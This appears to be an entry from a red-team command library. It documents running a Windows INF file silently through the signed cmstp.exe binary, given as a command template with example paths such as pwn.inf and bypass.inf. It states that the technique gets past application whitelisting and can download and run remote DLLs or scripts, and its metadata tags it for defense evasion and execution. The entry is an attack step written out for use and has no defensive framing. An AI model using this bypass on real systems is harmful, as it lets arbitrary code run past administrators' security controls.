---
id: b5428658-adfc-4265-be49-f8c7a295a246
type: command
executor: cmd
data: 'cmstp.exe /ni /s C:\$_DEST_DIR\$_FILE_NAME.inf'
output: |-
  C:\>cmstp.exe /ni /s C:\Windows\Tasks\pwn.inf
  C:\>
created_at: '2019-11-20T19:04:07.104296+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - defense-evasion
  - execution
verified: true
validated: true
---

# cmstp-execute-inf-file

## Command

```cmd
cmstp.exe /ni /s C:\$_DEST_DIR\$_FILE_NAME.inf
```

## Description

This command executes a specified INF file using CMSTP.exe in silent mode, processing the file to potentially download and run remote DLLs or SCT scripts. It is used in defense evasion scenarios to bypass application whitelisting by leveraging a signed Microsoft binary to execute arbitrary code.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `/ni` | Runs without user interaction (silent mode) | Yes |
| `/s` | Specifies the path to the INF file to process | Yes |
| `$_DEST_DIR` | Destination directory for the INF file (e.g., `Windows\Tasks`) | Yes |
| `$_FILE_NAME` | Name of the INF file (e.g., `pwn.inf`) | Yes |

## Examples

### Basic Usage

```cmd
cmstp.exe /ni /s C:\Windows\Tasks\pwn.inf
```

### Advanced Usage

For a temporary directory:

```cmd
cmstp.exe /ni /s C:\Temp\bypass.inf
```

## Expected Output

The command executes silently with minimal output, returning to the prompt if successful. Success is often confirmed by observing network activity (e.g., downloading from a remote URL in the INF) or spawned processes rather than console output.

```
C:\>cmstp.exe /ni /s C:\Windows\Tasks\pwn.inf
C:\>
```

## Related

- [[tools/CMSTP]]
- [[procedures/Windows-AppLocker-Whitelist-Bypass-via-cmstp]]
